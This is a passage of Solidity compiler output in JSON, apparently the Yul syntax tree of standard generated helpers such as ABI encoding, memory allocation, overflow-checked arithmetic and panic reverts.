{"name":"headStart","nodeType":"YulIdentifier","src":"16490:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16501:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16486:3:15"},"nodeType":"YulFunctionCall","src":"16486:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16478:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"16558:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16571:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16582:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16567:3:15"},"nodeType":"YulFunctionCall","src":"16567:17:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"16514:43:15"},"nodeType":"YulFunctionCall","src":"16514:71:15"},"nodeType":"YulExpressionStatement","src":"16514:71:15"}]},"name":"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"16440:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"16452:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"16463:4:15","type":""}],"src":"16370:222:15"},{"body":{"nodeType":"YulBlock","src":"16639:88:15","statements":[{"nodeType":"YulAssignment","src":"16649:30:15","value":{"arguments":[],"functionName":{"name":"allocate_unbounded","nodeType":"YulIdentifier","src":"16659:18:15"},"nodeType":"YulFunctionCall","src":"16659:20:15"},"variableNames":[{"name":"memPtr","nodeType":"YulIdentifier","src":"16649:6:15"}]},{"expression":{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"16708:6:15"},{"name":"size","nodeType":"YulIdentifier","src":"16716:4:15"}],"functionName":{"name":"finalize_allocation","nodeType":"YulIdentifier","src":"16688:19:15"},"nodeType":"YulFunctionCall","src":"16688:33:15"},"nodeType":"YulExpressionStatement","src":"16688:33:15"}]},"name":"allocate_memory","nodeType":"YulFunctionDefinition","parameters":[{"name":"size","nodeType":"YulTypedName","src":"16623:4:15","type":""}],"returnVariables":[{"name":"memPtr","nodeType":"YulTypedName","src":"16632:6:15","type":""}],"src":"16598:129:15"},{"body":{"nodeType":"YulBlock","src":"16773:35:15","statements":[{"nodeType":"YulAssignment","src":"16783:19:15","value":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"16799:2:15","type":"","value":"64"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"16793:5:15"},"nodeType":"YulFunctionCall","src":"16793:9:15"},"variableNames":[{"name":"memPtr","nodeType":"YulIdentifier","src":"16783:6:15"}]}]},"name":"allocate_unbounded","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nodeType":"YulTypedName","src":"16766:6:15","type":""}],"src":"16733:75:15"},{"body":{"nodeType":"YulBlock","src":"16880:241:15","statements":[{"body":{"nodeType":"YulBlock","src":"16985:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x41","nodeType":"YulIdentifier","src":"16987:16:15"},"nodeType":"YulFunctionCall","src":"16987:18:15"},"nodeType":"YulExpressionStatement","src":"16987:18:15"}]},"condition":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"16957:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"16965:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"16954:2:15"},"nodeType":"YulFunctionCall","src":"16954:30:15"},"nodeType":"YulIf","src":"16951:56:15"},{"nodeType":"YulAssignment","src":"17017:37:15","value":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"17047:6:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"17025:21:15"},"nodeType":"YulFunctionCall","src":"17025:29:15"},"variableNames":[{"name":"size","nodeType":"YulIdentifier","src":"17017:4:15"}]},{"nodeType":"YulAssignment","src":"17091:23:15","value":{"arguments":[{"name":"size","nodeType":"YulIdentifier","src":"17103:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"17109:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"17099:3:15"},"nodeType":"YulFunctionCall","src":"17099:15:15"},"variableNames":[{"name":"size","nodeType":"YulIdentifier","src":"17091:4:15"}]}]},"name":"array_allocation_size_t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"length","nodeType":"YulTypedName","src":"16864:6:15","type":""}],"returnVariables":[{"name":"size","nodeType":"YulTypedName","src":"16875:4:15","type":""}],"src":"16814:307:15"},{"body":{"nodeType":"YulBlock","src":"17185:40:15","statements":[{"nodeType":"YulAssignment","src":"17196:22:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"17212:5:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"17206:5:15"},"nodeType":"YulFunctionCall","src":"17206:12:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"17196:6:15"}]}]},"name":"array_length_t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"17168:5:15","type":""}],"returnVariables":[{"name":"length","nodeType":"YulTypedName","src":"17178:6:15","type":""}],"src":"17127:98:15"},{"body":{"nodeType":"YulBlock","src":"17290:40:15","statements":[{"nodeType":"YulAssignment","src":"17301:22:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"17317:5:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"17311:5:15"},"nodeType":"YulFunctionCall","src":"17311:12:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"17301:6:15"}]}]},"name":"array_length_t_string_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"17273:5:15","type":""}],"returnVariables":[{"name":"length","nodeType":"YulTypedName","src":"17283:6:15","type":""}],"src":"17231:99:15"},{"body":{"nodeType":"YulBlock","src":"17431:73:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"17448:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"17453:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"17441:6:15"},"nodeType":"YulFunctionCall","src":"17441:19:15"},"nodeType":"YulExpressionStatement","src":"17441:19:15"},{"nodeType":"YulAssignment","src":"17469:29:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"17488:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"17493:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"17484:3:15"},"nodeType":"YulFunctionCall","src":"17484:14:15"},"variableNames":[{"name":"updated_pos","nodeType":"YulIdentifier","src":"17469:11:15"}]}]},"name":"array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"17403:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"17408:6:15","type":""}],"returnVariables":[{"name":"updated_pos","nodeType":"YulTypedName","src":"17419:11:15","type":""}],"src":"17336:168:15"},{"body":{"nodeType":"YulBlock","src":"17606:73:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"17623:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"17628:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"17616:6:15"},"nodeType":"YulFunctionCall","src":"17616:19:15"},"nodeType":"YulExpressionStatement","src":"17616:19:15"},{"nodeType":"YulAssignment","src":"17644:29:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"17663:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"17668:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"17659:3:15"},"nodeType":"YulFunctionCall","src":"17659:14:15"},"variableNames":[{"name":"updated_pos","nodeType":"YulIdentifier","src":"17644:11:15"}]}]},"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"17578:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"17583:6:15","type":""}],"returnVariables":[{"name":"updated_pos","nodeType":"YulTypedName","src":"17594:11:15","type":""}],"src":"17510:169:15"},{"body":{"nodeType":"YulBlock","src":"17799:34:15","statements":[{"nodeType":"YulAssignment","src":"17809:18:15","value":{"name":"pos","nodeType":"YulIdentifier","src":"17824:3:15"},"variableNames":[{"name":"updated_pos","nodeType":"YulIdentifier","src":"17809:11:15"}]}]},"name":"array_storeLengthForEncoding_t_string_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"17771:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"17776:6:15","type":""}],"returnVariables":[{"name":"updated_pos","nodeType":"YulTypedName","src":"17787:11:15","type":""}],"src":"17685:148:15"},{"body":{"nodeType":"YulBlock","src":"17883:261:15","statements":[{"nodeType":"YulAssignment","src":"17893:25:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"17916:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"17898:17:15"},"nodeType":"YulFunctionCall","src":"17898:20:15"},"variableNames":[{"name":"x","nodeType":"YulIdentifier","src":"17893:1:15"}]},{"nodeType":"YulAssignment","src":"17927:25:15","value":{"arguments":[{"name":"y","nodeType":"YulIdentifier","src":"17950:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"17932:17:15"},"nodeType":"YulFunctionCall","src":"17932:20:15"},"variableNames":[{"name":"y","nodeType":"YulIdentifier","src":"17927:1:15"}]},{"body":{"nodeType":"YulBlock","src":"18090:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nodeType":"YulIdentifier","src":"18092:16:15"},"nodeType":"YulFunctionCall","src":"18092:18:15"},"nodeType":"YulExpressionStatement","src":"18092:18:15"}]},"condition":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"18011:1:15"},{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"18018:66:15","type":"","value":"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"},{"name":"y","nodeType":"YulIdentifier","src":"18086:1:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"18014:3:15"},"nodeType":"YulFunctionCall","src":"18014:74:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"18008:2:15"},"nodeType":"YulFunctionCall","src":"18008:81:15"},"nodeType":"YulIf","src":"18005:107:15"},{"nodeType":"YulAssignment","src":"18122:16:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"18133:1:15"},{"name":"y","nodeType":"YulIdentifier","src":"18136:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"18129:3:15"},"nodeType":"YulFunctionCall","src":"18129:9:15"},"variableNames":[{"name":"sum","nodeType":"YulIdentifier","src":"18122:3:15"}]}]},"name":"checked_add_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nodeType":"YulTypedName","src":"17870:1:15","type":""},{"name":"y","nodeType":"YulTypedName","src":"17873:1:15","type":""}],"returnVariables":[{"name":"sum","nodeType":"YulTypedName","src":"17879:3:15","type":""}],"src":"17839:305:15"},{"body":{"nodeType":"YulBlock","src":"18195:146:15","statements":[{"nodeType":"YulAssignment","src":"18205:25:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"18228:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"18210:17:15"},"nodeType":"YulFunctionCall","src":"18210:20:15"},"variableNames":[{"name":"x","nodeType":"YulIdentifier","src":"18205:1:15"}]},{"nodeType":"YulAssignment","src":"18239:25:15","value":{"arguments":[{"name":"y","nodeType":"YulIdentifier","src":"18262:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"18244:17:15"},"nodeType":"YulFunctionCall","src":"18244:20:15"},"variableNames":[{"name":"y","nodeType":"YulIdentifier","src":"18239:1:15"}]},{"body":{"nodeType":"YulBlock","src":"18286:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nodeType":"YulIdentifier","src":"18288:16:15"},"nodeType":"YulFunctionCall","src":"18288:18:15"},"nodeType":"YulExpressionStatement","src":"18288:18:15"}]},"condition":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"18280:1:15"},{"name":"y","nodeType":"YulIdentifier","src":"18283:1:15"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"18277:2:15"},"nodeType":"YulFunctionCall","src":"18277:8:15"},"nodeType":"YulIf","src":"18274:34:15"},{"nodeType":"YulAssignment","src":"18318:17:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"18330:1:15"},{"name":"y","nodeType":"YulIdentifier","src":"18333:1:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"18326:3:15"},"nodeType":"YulFunctionCall","src":"18326:9:15"},"variableNames":[{"name":"diff","nodeType":"YulIdentifier","src":"18318:4:15"}]}]},"name":"checked_sub_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nodeType":"YulTypedName","src":"18181:1:15","type":""},{"name":"y","nodeType":"YulTypedName","src":"18184:1:15","type":""}],"returnVariables":[{"name":"diff","nodeType":"YulTypedName","src":"18190:4:15","type":""}],"src":"18150:191:15"},{"body":{"nodeType":"YulBlock","src":"18392:51:15","statements":[{"nodeType":"YulAssignment","src":"18402:35:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"18431:5:15"}],"functionName":{"name":"cleanup_t_uint160","nodeType":"YulIdentifier","src":"18413:17:15"},"nodeType":"YulFunctionCall","src":"18413:24:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"18402:7:15"}]}]},"name":"cleanup_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"18374:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"18384:7:15","type":""}],"src":"18347:96:15"},{"body":{"nodeType":"YulBlock","src":"18491:48:15","statements":[{"nodeType":"YulAssignment","src":"18501:32:15","value":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"18526:5:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"18519:6:15"},"nodeType":"YulFunctionCall","src":"18519:13:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"18512:6:15"},"nodeType":"YulFunctionCall","src":"18512:21:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"18501:7:15"}]}]},"name":"cleanup_t_bool","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"18473:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"18483:7:15","type":""}],"src":"18449:90:15"},{"body":{"nodeType":"YulBlock","src":"18589:105:15","statements":[{"nodeType":"YulAssignment","src":"18599:89:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"18614:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"18621:66:15","type":"","value":"0xffffffff00000000000000000000000000000000000000000000000000000000"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"18610:3:15"},"nodeType":"YulFunctionCall","src":"18610:78:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"18599:7:15"}]}]},"name":"cleanup_t_bytes4","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"18571:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"18581:7:15","type":""}],"src":"18545:149:15"},{"body":{"nodeType":"YulBlock","src":"18745:81:15","statements":[{"nodeType":"YulAssignment","src":"18755:65:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"18770:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"18777:42:15","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"18766:3:15"},"nodeType":"YulFunctionCall","src":"18766:54:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"18755:7:15"}]}]},"name":"cleanup_t_uint160","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"18727:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"18737:7:15","type":""}],"src":"18700:126:15"},{"body":{"nodeType":"YulBlock","src":"18877:32:15","statements":[{"nodeType":"YulAssignment","src":"18887:16:15","value":{"name":"value","nodeType":"YulIdentifier","src":"18898:5:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"18887:7:15"}]}]},"name":"cleanup_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"18859:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"18869:7:15","type":""}],"src":"18832:77:15"},{"body":{"nodeType":"YulBlock","src":"18966:103:15","statements":[{"expression":{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"18989:3:15"},{"name":"src","nodeType":"YulIdentifier","src":"18994:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"18999:6:15"}],"functionName":{"name":"calldatacopy","nodeType":"YulIdentifier","src":"18976:12:15"},"nodeType":"YulFunctionCall","src":"18976:30:15"},"nodeType":"YulExpressionStatement","src":"18976:30:15"},{"expression":{"arguments":[{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"19047:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"19052:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"19043:3:15"},"nodeType":"YulFunctionCall","src":"19043:16:15"},{"kind":"number","nodeType":"YulLiteral","src":"19061:1:15","type":"","value":"0"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"19036:6:15"},"nodeType":"YulFunctionCall","src":"19036:27:15"},"nodeType":"YulExpressionStatement","src":"19036:27:15"}]},"name":"copy_calldata_to_memory","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nodeType":"YulTypedName","src":"18948:3:15","type":""},{"name":"dst","nodeType":"YulTypedName","src":"18953:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"18958:6:15","type":""}],"src":"18915:154:15"},{"body":{"nodeType":"YulBlock","src":"19124:258:15","statements":[{"nodeType":"YulVariableDeclaration","src":"19134:10:15","value":{"kind":"number","nodeType":"YulLiteral","src":"19143:1:15","type":"","value":"0"},"variables":[{"name":"i","nodeType":"YulTypedName","src":"19138:1:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"19203:63:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"19228:3:15"},{"name":"i","nodeType":"YulIdentifier","src":"19233:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"19224:3:15"},"nodeType":"YulFunctionCall","src":"19224:11:15"},{"arguments":[{"arguments":[{"name":"src","nodeType":"YulIdentifier","src":"19247:3:15"},{"name":"i","nodeType":"YulIdentifier","src":"19252:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"19243:3:15"},"nodeType":"YulFunctionCall","src":"19243:11:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"19237:5:15"},"nodeType":"YulFunctionCall","src":"19237:18:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"19217:6:15"},"nodeType":"YulFunctionCall","src":"19217:39:15"},"nodeType":"YulExpressionStatement","src":"19217:39:15"}]},"condition":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"19164:1:15"},{"name":"length","nodeType":"YulIdentifier","src":"19167:6:15"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"19161:2:15"},"nodeType":"YulFunctionCall","src":"19161:13:15"},"nodeType":"YulForLoop","post":{"nodeType":"YulBlock","src":"19175:19:15","statements":[{"nodeType":"YulAssignment","src":"19177:15:15","value":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"19186:1:15"},{"kind":"number","nodeType":"YulLiteral","src":"19189:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"19182:3:15"},"nodeType":"YulFunctionCall","src":"19182:10:15"},"variableNames":[{"name":"i","nodeType":"YulIdentifier","src":"19177:1:15"}]}]},"pre":{"nodeType":"YulBlock","src":"19157:3:15","statements":[]},"src":"19153:113:15"},{"body":{"nodeType":"YulBlock","src":"19300:76:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"dst","nodeType":"YulIdentifier","src":"19350:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"19355:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"19346:3:15"},"nodeType":"YulFunctionCall","src":"19346:16:15"},{"kind":"number","nodeType":"YulLiteral","src":"19364:1:15","type":"","value":"0"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"19339:6:15"},"nodeType":"YulFunctionCall","src":"19339:27:15"},"nodeType":"YulExpressionStatement","src":"19339:27:15"}]},"condition":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"19281:1:15"},{"name":"length","nodeType":"YulIdentifier","src":"19284:6:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"19278:2:15"},"nodeType":"YulFunctionCall","src":"19278:13:15"},"nodeType":"YulIf","src":"19275:101:15"}]},"name":"copy_memory_to_memory","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nodeType":"YulTypedName","src":"19106:3:15","type":""},{"name":"dst","nodeType":"YulTypedName","src":"19111:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"19116:6:15","type":""}],"src":"19075:307:15"},{"body":{"nodeType":"YulBlock","src":"19439:269:15","statements":[{"nodeType":"YulAssignment","src":"19449:22:15","value":{"arguments":[{"name":"data","nodeType":"YulIdentifier","src":"19463:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"19469:1:15","type":"","value":"2"}],"functionName":{"name":"div","nodeType":"YulIdentifier","src":"19459:3:15"},"nodeType":"YulFunctionCall","src":"19459:12:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"19449:6:15"}]},{"nodeType":"YulVariableDeclaration","src":"19480:38:15","value":{"arguments":[{"name":"data","nodeType":"YulIdentifier","src":"19510:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"19516:1:15","type":"","value":"1"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"19506:3:15"},"nodeType":"YulFunctionCall","src":"19506:12:15"},"variables":[{"name":"outOfPlaceEncoding","nodeType":"YulTypedName","src":"19484:18:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"19557:51:15","statements":[{"nodeType":"YulAssignment","src":"19571:27:15","value":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"19585:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"19593:4:15","type":"","value":"0x7f"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"19581:3:15"},"nodeType":"YulFunctionCall","src":"19581:17:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"19571:6:15"}]}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nodeType":"YulIdentifier","src":"19537:18:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"19530:6:15"},"nodeType":"YulFunctionCall","src":"19530:26:15"},"nodeType":"YulIf","src":"19527:81:15"},{"body":{"nodeType":"YulBlock","src":"19660:42:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x22","nodeType":"YulIdentifier","src":"19674:16:15"},"nodeType":"YulFunctionCall","src":"19674:18:15"},"nodeType":"YulExpressionStatement","src":"19674:18:15"}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nodeType":"YulIdentifier","src":"19624:18:15"},{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"19647:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"19655:2:15","type":"","value":"32"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"19644:2:15"},"nodeType":"YulFunctionCall","src":"19644:14:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"19621:2:15"},"nodeType":"YulFunctionCall","src":"19621:38:15"},"nodeType":"YulIf","src":"19618:84:15"}]},"name":"extract_byte_array_length","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nodeType":"YulTypedName","src":"19423:4:15","type":""}],"returnVariables":[{"name":"length","nodeType":"YulTypedName","src":"19432:6:15","type":""}],"src":"19388:320:15"},{"body":{"nodeType":"YulBlock","src":"19757:238:15","statements":[{"nodeType":"YulVariableDeclaration","src":"19767:58:15","value":{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"19789:6:15"},{"arguments":[{"name":"size","nodeType":"YulIdentifier","src":"19819:4:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"19797:21:15"},"nodeType":"YulFunctionCall","src":"19797:27:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"19785:3:15"},"nodeType":"YulFunctionCall","src":"19785:40:15"},"variables":[{"name":"newFreePtr","nodeType":"YulTypedName","src":"19771:10:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"19936:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x41","nodeType":"YulIdentifier","src":"19938:16:15"},"nodeType":"YulFunctionCall","src":"19938:18:15"},"nodeType":"YulExpressionStatement","src":"19938:18:15"}]},"condition":{"arguments":[{"arguments":[{"name":"newFreePtr","nodeType":"YulIdentifier","src":"19879:10:15"},{"kind":"number","nodeType":"YulLiteral","src":"19891:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"19876:2:15"},"nodeType":"YulFunctionCall","src":"19876:34:15"},{"arguments":[{"name":"newFreePtr","nodeType":"YulIdentifier","src":"19915:10:15"},{"name":"memPtr","nodeType":"YulIdentifier","src":"19927:6:15"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"19912:2:15"},"nodeType":"YulFunctionCall","src":"19912:22:15"}],"functionName":{"name":"or","nodeType":"YulIdentifier","src":"19873:2:15"},"nodeType":"YulFunctionCall","src":"19873:62:15"},"nodeType":"YulIf","src":"19870:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"19974:2:15","type":"","value":"64"},{"name":"newFreePtr","nodeType":"YulIdentifier","src":"19978:10:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"19967:6:15"},"nodeType":"YulFunctionCall","src":"19967:22:15"},"nodeType":"YulExpressionStatement","src":"19967:22:15"}]},"name":"finalize_allocation","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"19743:6:15","type":""},{"name":"size","nodeType":"YulTypedName","src":"19751:4:15","type":""}],"src":"19714:281:15"},{"body":{"nodeType":"YulBlock","src":"20029:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20046:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"20049:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20039:6:15"},"nodeType":"YulFunctionCall","src":"20039:88:15"},"nodeType":"YulExpressionStatement","src":"20039:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20143:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"20146:4:15","type":"","value":"0x11"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20136:6:15"},"nodeType":"YulFunctionCall","src":"20136:15:15"},"nodeType":"YulExpressionStatement","src":"20136:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20167:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"20170:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"20160:6:15"},"nodeType":"YulFunctionCall","src":"20160:15:15"},"nodeType":"YulExpressionStatement","src":"20160:15:15"}]},"name":"panic_error_0x11","nodeType":"YulFunctionDefinition","src":"20001:180:15"},{"body":{"nodeType":"YulBlock","src":"20215:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20232:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"20235:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20225:6:15"},"nodeType":"YulFunctionCall","src":"20225:88:15"},"nodeType":"YulExpressionStatement","src":"20225:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20329:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"20332:4:15","type":"","value":"0x12"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20322:6:15"},"nodeType":"YulFunctionCall","src":"20322:15:15"},"nodeType":"YulExpressionStatement","src":"20322:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20353:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"20356:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"20346:6:15"},"nodeType":"YulFunctionCall","src"